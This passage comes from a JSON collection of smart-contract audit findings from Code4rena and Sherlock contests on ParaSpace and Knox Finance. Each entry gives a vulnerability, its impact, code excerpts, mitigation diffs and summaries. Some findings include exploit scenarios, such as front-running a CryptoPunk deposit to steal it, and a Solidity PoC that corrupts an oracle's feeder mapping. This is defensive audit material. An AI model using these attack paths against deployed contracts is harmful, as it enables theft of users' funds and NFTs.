vars.nextVariableRate\n            ) = IReserveInterestRateStrategy(reserve.interestRateStrategyAddress)\n                .calculateInterestRates(\n                    DataTypes.CalculateInterestRatesParams({\n                        liquidityAdded: liquidityAdded,\n                        liquidityTaken: liquidityTaken,\n                        totalVariableDebt: vars.totalVariableDebt,\n                        reserveFactor: reserveCache.reserveFactor,\n                        reserve: reserveAddress,\n                        xToken: reserveCache.xTokenAddress\n                    })\n                );\n    ...\n    }\n\n5.  Finally call to `calculateInterestRates` function on DefaultReserveInterestRateStrategy#L127 contract is made which calculates the interest rate\n\n<!---->\n\n    function calculateInterestRates(\n            DataTypes.CalculateInterestRatesParams calldata params\n        ) external view override returns (uint256, uint256) {\n    ...\n    if (vars.totalDebt != 0) {\n                vars.availableLiquidity =\n                    IToken(params.reserve).balanceOf(params.xToken) +\n                    params.liquidityAdded -\n                    params.liquidityTaken;\n\n                vars.availableLiquidityPlusDebt =\n                    vars.availableLiquidity +\n                    vars.totalDebt;\n                vars.borrowUsageRatio = vars.totalDebt.rayDiv(\n                    vars.availableLiquidityPlusDebt\n                );\n                vars.supplyUsageRatio = vars.totalDebt.rayDiv(\n                    vars.availableLiquidityPlusDebt\n                );\n            }\n    ...\n    vars.currentLiquidityRate = vars\n                .currentVariableBorrowRate\n                .rayMul(vars.supplyUsageRatio)\n                .percentMul(\n                    PercentageMath.PERCENTAGE_FACTOR - params.reserveFactor\n                );\n\n            return (vars.currentLiquidityRate, vars.currentVariableBorrowRate);\n    }\n\n6.  As we can see in above code, `vars.availableLiquidity` is calculated as `IToken(params.reserve).balanceOf(params.xToken) +params.liquidityAdded - params.liquidityTaken`\n\n7.  But the problem is that debt token is already transferred to `xToken` which means `xToken` already consist of `params.liquidityAdded`. Hence the calculation ultimately becomes `(xTokenBeforeBalance+params.liquidityAdded) +params.liquidityAdded - params.liquidityTaken`\n\n8.  This is incorrect and would lead to higher `vars.availableLiquidity` which ultimately impacts the `currentLiquidityRate`\n\n### Recommended Mitigation Steps\n\nTransfer the debt asset post interest calculation\n\n    function _burnDebtTokens(\n            DataTypes.ReserveData storage liquidationAssetReserve,\n            DataTypes.ExecuteLiquidateParams memory params,\n            ExecuteLiquidateLocalVars memory vars\n        ) internal {\n    IPToken(vars.liquidationAssetReserveCache.xTokenAddress)\n                .handleRepayment(params.liquidator, vars.actualLiquidationAmount);\n            // Burn borrower's debt token\n            vars\n                .liquidationAssetReserveCache\n                .nextScaledVariableDebt = IVariableDebtToken(\n                vars.liquidationAssetReserveCache.variableDebtTokenAddress\n            ).burn(\n                    params.borrower,\n                    vars.actualLiquidationAmount,\n                    vars.liquidationAssetReserveCache.nextVariableBorrowIndex\n                );\n\n    liquidationAssetReserve.updateInterestRates(\n                vars.liquidationAssetReserveCache,\n                params.liquidationAsset,\n                vars.actualLiquidationAmount,\n                0\n            );\n    IERC20(params.liquidationAsset).safeTransferFrom(\n                vars.payer,\n                vars.liquidationAssetReserveCache.xTokenAddress,\n                vars.actualLiquidationAmount\n            );\n    ...\n    ...\n    }\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LiquidationLogic.sol contract, which is part of the ParaSpace protocol. The debt tokens are being transferred before calculating the interest rates, but the interest rate calculation function assumes that debt token has not yet been sent. This leads to an incorrect outcome of `currentLiquidityRate`.\n\nThe bug can be replicated by following the steps in the Proof of Concept section: Liquidator L1 calls the `executeLiquidateERC20` function, which internally calls the `_burnDebtTokens` function. This function first transfers the debt asset to xToken using the `safeTransferFrom` function, which increases the balance of xTokenAddress for liquidationAsset. Then the `updateInterestRates` function is called on ReserveLogic.sol#L169, which finally calls the `calculateInterestRates` function on DefaultReserveInterestRateStrategy#L127. This calculates the interest rate, but the calculation for `vars.availableLiquidity` is incorrect as it includes the `params.liquidityAdded` value twice.\n\nThe recommended mitigation steps for this bug is to transfer the debt asset post interest calculation. This can be done by rearranging the code in the `_burnDebtTokens` function, so that the `safeTransferFrom` function is called after the `updateInterestRates` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/173",
      "tags": [],
      "finders": [
        "csanuragjain",
        "unforgiven  cccz"
      ]
    },
    {
      "id": "15975",
      "title": "[H-02] Anyone can steal CryptoPunk during the deposit flow to WPunkGateway",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L77-L95><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L129-L155><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L167-L193>\n\nAll CryptoPunk deposits can be stolen.\n\n### Proof of Concept\n\nCryptoPunks were created before the ERC721 standard. A consequence of this is that they do not possess the `transferFrom` method. To approximate this a user can `offerPunkForSaleToAddress` for a price of 0 to effectively approve the contract to `transferFrom`.\n\n[WPunkGateway.sol#L77-L95](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L77-L95)\n\n    function supplyPunk(\n        DataTypes.ERC721SupplyParams[] calldata punkIndexes,\n        address onBehalfOf,\n        uint16 referralCode\n    ) external nonReentrant {\n        for (uint256 i = 0; i < punkIndexes.length; i++) {\n            Punk.buyPunk(punkIndexes[i].tokenId);\n            Punk.transferPunk(proxy, punkIndexes[i].tokenId);\n            // gatewayProxy is the sender of this function, not the original gateway\n            WPunk.mint(punkIndexes[i].tokenId);\n        }\n        Pool.supplyERC721(\n            address(WPunk),\n            punkIndexes,\n            onBehalfOf,\n            referralCode\n        );\n    }\n\nThe current implementation of `WPunkGateway#supplyPunk` allows anyone to execute and determine where the nTokens are minted to. To complete the flow supply flow a user would need to `offerPunkForSaleToAddress` for a price of 0 to `WPunkGateway`. After they have done this, anyone can call the function to deposit the punk and mint the nTokens to themselves, effectively stealing it.\n\nExample:<br>\n`User A` owns `tokenID` of 1. They want to deposit it so they call `offerPunkForSaleToAddress` with an amount of 0, effectively approving the `WPunkGateway` to transfer their CryptoPunk. `User B` monitors the transactions and immediately calls `supplyPunk` with themselves as `onBehalfOf`. This completes the transfer of the CryptoPunk and deposits it into the pool but mints the `nTokens` to `User B`, allowing them to effectively steal the CryptoPunk.\n\nThe same fundamental issue exists with `acceptBidWithCredit` and `batchAcceptBidWithCredit`.\n\n### Recommended Mitigation Steps\n\nQuery the punkIndexToAddress to find the owner and only allow owner to deposit:\n\n        for (uint256 i = 0; i < punkIndexes.length; i++) {\n    +       address owner = Punk.punkIndexToAddress(punkIndexes[i].tokenId);\n    +       require(owner == msg.sender);\n\n            Punk.buyPunk(punkIndexes[i].tokenId);\n            Punk.transferPunk(proxy, punkIndexes[i].tokenId);\n            // gatewayProxy is the sender of this function, not the original gateway\n            WPunk.mint(punkIndexes[i].tokenId);\n        }\n\n**[yubo-ruan (Paraspace) confirmed](https://github.com/code-423n4/2022-11-paraspace-findings/issues/137)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the WPunkGateway.sol code which allows all CryptoPunk deposits to be stolen. A proof of concept has been provided which shows that a user can call the function 'offerPunkForSaleToAddress' with a price of 0 to effectively approve the contract to transferFrom. This allows anyone to call the function to deposit the punk and mint the nTokens to themselves, effectively stealing it. \n\nThe recommended mitigation steps for this vulnerability include querying the punkIndexToAddress to find the owner and only allow the owner to deposit. This will require an additional line of code which checks if the owner of the punk is the same as the sender of the message. \n\nIn conclusion, this bug report outlines a vulnerability in the WPunkGateway.sol code which allows all CryptoPunk deposits to be stolen. The recommended mitigation steps include querying the punkIndexToAddress to find the owner and only allowing the owner to deposit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/137",
      "tags": [],
      "finders": [
        "0x52",
        "cccz",
        "Dravee",
        "xiaoming90",
        "KingNFT",
        "c7e7eff",
        "Big0XDev"
      ]
    },
    {
      "id": "15974",
      "title": "[H-01] Data corruption in NFTFloorOracle; Denial of Service",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/NFTFloorOracle.sol#L335\n\n\n## Vulnerability details\n\n## Impact\nDuring `_removeFeeder` operation in `NFTFloorOracle` contract, the feeder is removed from `feeders` array, and linking in `feederPositionMap` for the specific feeder is removed. Deletion logic is implemented in \"Swap + Pop\" way, so indexes changes, but existing **code doesn't update indexes in** `feederPositionMap` **after feeder removal**, which causes the issue of Denial of Service for further removals.\nAs a result:\n- Impossible to remove some `feeders` from the contract due to Out of Bounds array access. Removal fails because of transaction revert.\n- Data in `feederPositionMap` is corrupted after some `feeders` removal. Data linking from `feederPositionMap.index` to `feeders` array is broken. \n\n## Proof of Concept\n```\n    address internal feederA = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n    address internal feederB = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;\n    address internal feederC = 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;\n\n    function corruptFeedersMapping() external {\n        console.log(\"Starting from empty feeders array. Array size: %s\", feeders.length);\n        address[] memory initialFeeders = new address[](3);\n        initialFeeders[0] = feederA;\n        initialFeeders[1] = feederB;\n        initialFeeders[2] = feederC;\n        this.addFeeders(initialFeeders);\n        console.log(\"Feeders array: [%s, %s, %s]\", initialFeeders[0], initialFeeders[1], initialFeeders[2]);\n        console.log(\"Remove feeder B\");\n        this.removeFeeder(feederB);\n        console.log(\"feederPositionMap[A] = %s, feederPositionMap[C] = %s\", feederPositionMap[feederA].index, feederPositionMap[feederC].index);\n        console.log(\"Mapping for Feeder C store index 2, which was not updated after removal of B. Feeders array length is : %s\", feeders.length);\n        console.log(\"Try remove Feeder C. Transaction will be reverted because of access out of bounds of array. Data is corrupted\");\n        this.removeFeeder(feederC);\n    }\n```\nSnippet execution result:\n![Alt text](https://i.gyazo.com/90ac873cd71194527d4d3b9bfe6e317e.png \"Optional title\")\n\n## Tools Used\nVisual inspection; Solidity snippet for PoC\n\n## Recommended Mitigation Steps\nUpdate index in `feederPositionMap` after feeders swap and pop.\n```\nfeeders[feederIndex] = feeders[feeders.length - 1];\nfeederPositionMap[feeders[feederIndex]].index = feederIndex; //Index update added as a recommendation\nfeeders.pop();\n```",
      "summary": "\nThis bug report is about an issue with the `NFTFloorOracle` contract in the Paraspace project. The issue is that during the `_removeFeeder` operation, the feeder is removed from the `feeders` array, but the existing code does not update the indexes in the `feederPositionMap` after feeder removal. This causes a Denial of Service for further removals, as it is impossible to remove some `feeders` from the contract due to Out of Bounds array access, and the data in `feederPositionMap` is corrupted after some `feeders` removal.\n\nThe issue was identified through visual inspection and a Solidity snippet was used to provide a proof of concept. The recommended mitigation steps are to update the index in `feederPositionMap` after feeders swap and pop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/79",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Trust",
        "kaliberpoziomka8552",
        "Jeiwan",
        "minhquanym",
        "RaymondFam",
        "Englave",
        "Lambda",
        "unforgiven",
        "9svR6w",
        "Josiah"
      ]
    },
    {
      "id": "3394",
      "title": "M-7: processAuction() in VaultAdmin.sol can be called multiple times by keeper if the auction is canceled.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/26 \n\n## Found by \nctf\\_sec\n\n## Summary\n\nprocessAuction() in VaultAdmin.sol can be called multiple times by keeper if the auction is canceled.\n\n## Vulnerability Detail\n\nprocessAuction() in VaultAdmin.sol can be called multiple times by keeper, the code below would execute more than one times\nif the auction is canceled.\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultAdmin.sol#L259-L280\n\nbecause it is the line of code inside the function processAuction in VaultAdmin.sol below that can change the auction status to PROCESSED. \n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultAdmin.sol#L326\n\nthis code only runs when the auction is finalized, it not finalized, the auction is in Canceled State and \n\n```solidity\n   bool cancelled = l.Auction.isCancelled(lastEpoch);\n        bool finalized = l.Auction.isFinalized(lastEpoch);\n\n        require(\n            (!finalized && cancelled) || (finalized && !cancelled),\n            \"auction is not finalized nor cancelled\"\n        );\n```\n\nwould always pass because the auction is in cancel state.\n\n## Impact\n\nWhy the processAuction should not be called multiple times?\n\nIn the first time it is called, the withdrawal lock is released so user can withdraw fund,\n\n```solidity\n // deactivates withdrawal lock\n  l.auctionProcessed = true;\n```\n\nthen if we called again, the lastTotalAssets can be updated multiple times.\n\n```solidity\n        // stores the last total asset amount, this is effectively the amount of assets held\n        // in the vault at the start of the auction\n        l.lastTotalAssets = _totalAssets();\n```\n\nthe total asset can be lower and lower because people are withdrawing their fund.\n\nthen when _collectPerformanceFee is called, the performance may still be collected\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultInternal.sol#L513-L530\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWe recommend the project lock the epoch and make it impossible for keeper to call the processAuction again. \n\n## Discussion\n\n**0xCourtney**\n\nThe `Keeper` is an EOA owned/controlled by the protocol team and therefore considered trusted.\n\n**Evert0x**\n\n@0xCourtney as there are require statements based on the auction state, is it a valid use case that `processAuction()` get's called multiple times (by the keeper)? If not I can see the argument for the missing check.\n\n**0xCourtney**\n\nNo, this function should only be called once. We'll add a guard to prevent multiple calls.",
      "summary": "\nThis bug report is about an issue with processAuction() in VaultAdmin.sol, which is a part of the Knox protocol. It was found by ctf_sec and it states that the processAuction() function can be called multiple times by the keeper if the auction is canceled. This could lead to the withdrawal lock being released multiple times, allowing users to withdraw funds multiple times, and the total assets held in the vault could be reduced. It also allows for performance fees to be collected multiple times. Manual review was used to find the issue.\n\nThe recommendation is to add a guard to prevent multiple calls of the processAuction() function. This was discussed by 0xCourtney and Evert0x, with 0xCourtney stating that the Keeper is an EOA owned/controlled by the protocol team and therefore considered trusted, and Evert0x asking if it is a valid use case for the processAuction() function to be called multiple times. 0xCourtney then stated that the function should only be called once, and they would add a guard to prevent multiple calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/26",
      "tags": [],
      "finders": [
        "ctf\\_sec"
      ]
    },
    {
      "id": "3393",
      "title": "M-6: Internal `OptionMath._getPositivePlaceValues()` function do not handle values below `185`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/43 \n\n## Found by \nshung, ArbitraryExecution\n\n## Summary\n\nInternal `OptionMath._getPositivePlaceValues()` function do not handle values below `185`.\n\n## Vulnerability Detail\n\n`OptionMath._getPositivePlaceValues()` is a library function used by special floor and ceiling functions which are in turn used in the calculation of the strike price. However, `_getPositivePlaceValues()` function incorrectly reverts when the provided value is below `185`. This happens because a 64x64 `185` equals to a wad value with one digit, which is represented internally with one extra decimal. Since the division by 100 will return zero for a number with less than three digits, the division in the following line reverts due to division by zero.\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/libraries/OptionMath.sol#L101-L103\n\n## Impact\n\nThis might prevent auctions from starting due to the following execution flow `VaultAdmin.initializeAuction() -> VaultInternal._setOptionParameters() -> Pricer.snapToGrid64x64() -> OptionMath.ceil64x64() -> OptionMath._getPositivePlaceValues()`.\n\nThere can also be more serious issues if this library is reused in other places.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/libraries/OptionMath.sol#L93-L103\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nApplying the following diff will properly handle division by zero, such that values below `185` can still be rounded up or down.\n\n```diff\ndiff --git a/knox-contracts/contracts/libraries/OptionMath.sol b/knox-contracts/contracts/libraries/OptionMath.sol\nindex 746dd78..8ed2bbc 100644\n--- a/knox-contracts/contracts/libraries/OptionMath.sol\n+++ b/knox-contracts/contracts/libraries/OptionMath.sol\n@@ -92,15 +92,21 @@ library OptionMath {\n \n         // setup the first place value\n         values[0].ruler = ruler;\n-        values[0].value = (integer / values[0].ruler) % 10;\n-\n-        // setup the second place value\n-        values[1].ruler = ruler / 10;\n-        values[1].value = (integer / values[1].ruler) % 10;\n-\n-        // setup the third place value\n-        values[2].ruler = ruler / 100;\n-        values[2].value = (integer / values[2].ruler) % 10;\n+        if (values[0].ruler != 0) {\n+            values[0].value = (integer / values[0].ruler) % 10;\n+\n+            // setup the second place value\n+            values[1].ruler = ruler / 10;\n+            if (values[1].ruler != 0) {\n+                values[1].value = (integer / values[1].ruler) % 10;\n+\n+                // setup the third place value\n+                values[2].ruler = ruler / 100;\n+                if (values[2].ruler != 0) {\n+                    values[2].value = (integer / values[2].ruler) % 10;\n+                }\n+            }\n+        }\n \n         return (integer, values);\n     }\n```",
      "summary": "\nThis bug report details an issue with the `OptionMath._getPositivePlaceValues()` function, which is used by special floor and ceiling functions in the calculation of the strike price. The issue is that the function incorrectly reverts when the provided value is below `185`. This is due to a division by zero occurring when a 64x64 `185` equals to a wad value with one digit, which is represented internally with one extra decimal. \n\nThe impact of this issue is that auctions might be prevented from starting due to the execution flow `VaultAdmin.initializeAuction() -> VaultInternal._setOptionParameters() -> Pricer.snapToGrid64x64() -> OptionMath.ceil64x64() -> OptionMath._getPositivePlaceValues()`. There can also be more serious issues if this library is reused in other places. \n\nThe bug was found by shung and ArbitraryExecution through manual review. The code snippet and recommendation to fix the issue is also included in the report. The recommendation is to apply the given diff to properly handle division by zero, such that values below `185` can still be rounded up or down.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/43",
      "tags": [],
      "finders": [
        "shung",
        "ArbitraryExecution"
      ]
    },
    {
      "id": "3392",
      "title": "M-5: _getNextFriday() returns wrong value when timestamp is between Monday 12am and 8am.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/47 \n\n## Found by \nyixxas\n\n## Summary\n`_getNextFriday(Monday)` should return next Friday 8am timestamp. But if timestamp is on a Monday 12am - 8am, it will wrongly return the same week Friday.\n\n## Vulnerability Detail\n\n`friday8am - timestamp < 4 days` check fails when the `timestamp` is between Monday 12am to Monday 8am, since `friday8am - timestamp > 4 days`. It will wrongly return the same week Friday instead of next Friday.\n\n## Impact\n\n`_setOptionParameters()` relies on `_getNextFriday()` to set option's expiry. When the timestamp is between Monday 12am and Monday 8am, expiry date will be wrong causing malfunction of protocol.\n\n## Code Snippet\n\n[VaultInternal.sol#L746-L759](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultInternal.sol#L746-L759)\n```solidity\n    function _getNextFriday(uint256 timestamp) internal pure returns (uint256) {\n        // dayOfWeek = 0 (sunday) - 6 (saturday)\n        uint256 dayOfWeek = ((timestamp / 1 days) + 4) % 7;\n        uint256 nextFriday = timestamp + ((7 + 5 - dayOfWeek) % 7) * 1 days;\n        uint256 friday8am = nextFriday - (nextFriday % (24 hours)) + (8 hours);\n\n        // If the timestamp is on a Friday or between Monday-Thursday\n        // return Friday of the following week\n        if (timestamp >= friday8am || friday8am - timestamp < 4 days) {\n            friday8am += 7 days;\n        }\n        return friday8am;\n    }\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd 8 hours to the check when doing subtraction of `friday8am - timestamp`.\n\n```diff\n    function _getNextFriday(uint256 timestamp) internal pure returns (uint256) {\n        // dayOfWeek = 0 (sunday) - 6 (saturday)\n        uint256 dayOfWeek = ((timestamp / 1 days) + 4) % 7;\n        uint256 nextFriday = timestamp + ((7 + 5 - dayOfWeek) % 7) * 1 days;\n        uint256 friday8am = nextFriday - (nextFriday % (24 hours)) + (8 hours);\n\n        // If the timestamp is on a Friday or between Monday-Thursday\n        // return Friday of the following week\n-       if (timestamp >= friday8am || friday8am - timestamp < 4 days) {\n+       if (timestamp >= friday8am || friday8am - timestamp < (4 days + 8 hours)) {\n            friday8am += 7 days;\n        }\n        return friday8am;\n    }\n}\n```",
      "summary": "\nThis bug report is about an issue found in the `_getNextFriday()` function of the VaultInternal.sol file. The issue is that when the timestamp is between Monday 12am and 8am, the function returns the same week Friday instead of the next Friday. This causes an issue in the `_setOptionParameters()` function, which relies on the `_getNextFriday()` function to set the expiry date. The expiry date will be wrong, causing malfunction of the protocol. The bug was found by yixxas through manual review. The recommendation to fix the issue is to add 8 hours to the check when doing the subtraction of `friday8am - timestamp`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/47",
      "tags": [],
      "finders": [
        "yixxas"
      ]
    },
    {
      "id": "3391",
      "title": "M-4: Users can avoid performance fees by withdrawing before the end of the epoch forcing other users to pay their fees",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/75 \n\n## Found by \n0x52\n\n## Summary\n\nNo performance fees are taken when user withdraws early from the vault but their withdrawal value will be used to take fees, which will be taken from other users.\n\n## Vulnerability Detail\n\n    uint256 adjustedTotalAssets = _totalAssets() + l.totalWithdrawals;\n\n    if (adjustedTotalAssets > l.lastTotalAssets) {\n        netIncome = adjustedTotalAssets - l.lastTotalAssets;\n\n        feeInCollateral = l.performanceFee64x64.mulu(netIncome);\n\n        ERC20.safeTransfer(l.feeRecipient, feeInCollateral);\n    }\n\nWhen taking the performance fees, it factors in both the current assets of the vault as well as the total value of withdrawals that happened during the epoch. Fees are paid from the collateral tokens in the vault, at the end of the epoch. Paying the fees like this reduces the share price of all users, which effectively works as a fee applied to all users. The problem is that withdraws that take place during the epoch are not subject to this fee and the total value of all their withdrawals are added to the adjusted assets of the vault. This means that they don't pay any performance fee but the fee is still taken from the vault collateral. In effect they completely avoid the fee force all there other users of the vault to pay it for them.\n\n## Impact\n\nUser can avoid performance fees and force other users to pay them\n\n## Code Snippet\n\n[VaultInternal.sol#L504-L532](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultInternal.sol#L504-L532)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFees should be taken on withdrawals that occur before vault is settled",
      "summary": "\nThis bug report is about the vulnerability found in the VaultInternal.sol code, which allows users to avoid performance fees by withdrawing before the end of the epoch, forcing other users to pay their fees. This vulnerability was found by manual review and was located at VaultInternal.sol#L504-L532. \n\nThe code in question takes both the current assets of the vault and the total value of withdrawals that happened during the epoch into account when calculating the performance fees. This means that when a user withdraws during the epoch, their withdrawal value is added to the adjusted assets of the vault, and they don't pay any performance fee, but the fee is still taken from the vault collateral. \n\nThe impact of this vulnerability is that users can avoid performance fees and force other users to pay them. The recommendation to fix this issue is to take fees on withdrawals that occur before the vault is settled.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/75",
      "tags": [
        "Bypass limit",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3390",
      "title": "M-3: `epochsByBuyer[]` can lose records",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/86 \n\n## Found by \nrvierdiiev, hansfriese, \\_\\_141345\\_\\_, bin2chen\n\n## Summary\n\nWhen `cancelLimitOrder()`, the `epoch` will be removed from `epochsByBuyer[]`, but the user could have other orders on the orderbook, the record will be inaccurate and mislead the users.\n\n\n## Vulnerability Detail\n\nIf a user put 2 limit orders with different prices, 2 separate id will be assigned, but only 1 epoch will be added to the `epochsByBuyer[]` array. \nIf the user cancel 1 of the orders, the `epoch` will be removed from `epochsByBuyer[]`, it will be impossible to track the other orders put by the user. And the `getEpochsByBuyer()` function will return inaccurate result.\n\n\n\n## Impact\n\nIf some users rely on the results of `getEpochsByBuyer()` for new orders, the returned inaccurate results could be misleading, and cause potential loss to the users due to wrong information.\n\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L545-L553\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/Auction.sol#L220\n\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nOnly remove the `epochsByBuyer` records when all the orders of the user is cancelled.",
      "summary": "\nThis bug report is about an issue found in the code of the Knox Auction smart contract. This issue occurs when a user places two limit orders with different prices, and the user cancels one of the orders. The issue is that only one epoch will be added to the `epochsByBuyer[]` array, and when the user cancels the order, the `epoch` will be removed from `epochsByBuyer[]`. This means that it is impossible to track the other orders put by the user, and the `getEpochsByBuyer()` function will return inaccurate results. This could lead to potential losses for users due to wrong information. The bug was found by rvierdiiev, hansfriese, \\_\\_141345\\_\\_, and bin2chen, and was confirmed with manual review. The recommendation is to only remove the `epochsByBuyer` records when all the orders of the user is cancelled.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/86",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "bin2chen",
        "hansfriese",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "3389",
      "title": "M-2: Chainlink's `latestRoundData` might return stale or incorrect results",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/137 \n\n## Found by \nJeiwan, csanuragjain, berndartmueller, jayphbee, joestakey, Olivierdem, Ruhum, GalloDaSballo, \\_\\_141345\\_\\_, Trumpero, ArbitraryExecution, hansfriese, ali\\_shehab, cccz, 0xNazgul, ak1, ctf\\_sec, minhquanym\n\n## Summary\n\nChainlink's `latestRoundData()` is used but there is no check if the return value indicates stale data. This could lead to stale prices according to the Chainlink documentation:\n\n- https://docs.chain.link/docs/historical-price-data/#historical-rounds\n\n## Vulnerability Detail\n\nThe `PricerInternal._latestAnswer64x64` function uses Chainlink's `latestRoundData()` to get the latest price. However, there is no check if the return value indicates stale data.\n\n## Impact\n\nThe `PricerInternal` could return stale price data for the underlying asset.\n\n## Code Snippet\n\n[PricerInternal.\\_latestAnswer64x64](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/pricer/PricerInternal.sol#L50-L52)\n\n```solidity\n/**\n  * @notice gets the latest price of the underlying denominated in the base\n  * @return price of underlying asset as 64x64 fixed point number\n  */\nfunction _latestAnswer64x64() internal view returns (int128) {\n    (, int256 basePrice, , , ) = BaseSpotOracle.latestRoundData();\n    (, int256 underlyingPrice, , , ) =\n        UnderlyingSpotOracle.latestRoundData();\n\n    return ABDKMath64x64.divi(underlyingPrice, basePrice);\n}\n```\n\n## Tool Used\n\nManual review\n\n## Recommendation\n\nConsider adding checks for stale data. e.g\n\n```solidity\n(uint80 roundId, int256 basePrice, , uint256 updatedAt, uint80 answeredInRound) = BaseSpotOracle.latestRoundData();\n\nrequire(answeredInRound >= roundId, \"Price stale\");\nrequire(block.timestamp - updatedAt < PRICE_ORACLE_STALE_THRESHOLD, \"Price round incomplete\");\n```",
      "summary": "\nThis bug report is about Chainlink's `latestRoundData()` function which could return stale or incorrect results. It was found by Jeiwan, csanuragjain, berndartmueller, jayphbee, joestakey, Olivierdem, Ruhum, GalloDaSballo, \\_\\_141345\\_\\_, Trumpero, ArbitraryExecution, hansfriese, ali\\_shehab, cccz, 0xNazgul, ak1, ctf\\_sec, minhquanym and reported on Github. The function `PricerInternal._latestAnswer64x64` uses Chainlink's `latestRoundData()` to get the latest price but there is no check if the return value indicates stale data. This could lead to stale prices according to the Chainlink documentation. The impact of this bug is that the `PricerInternal` could return stale price data for the underlying asset. Manual review was used to detect the bug and the recommendation is to consider adding checks for stale data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/137",
      "tags": [
        "Stale Price",
        "Chainlink"
      ],
      "finders": [
        "csanuragjain",
        "0xNazgul",
        "jayphbee",
        "cccz",
        "ali\\_shehab",
        "Jeiwan",
        "minhquanym",
        "joestakey",
        "GalloDaSballo",
        "Ruhum",
        "ArbitraryExecution",
        "berndartmueller",
        "Trumpero",
        "hansfriese",
        "\\_\\_141345\\_\\_",
        "ak1",
        "Olivierdem",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3388",
      "title": "M-1: ## Auction can be ended with large limit order",
      "impact": "MEDIUM",
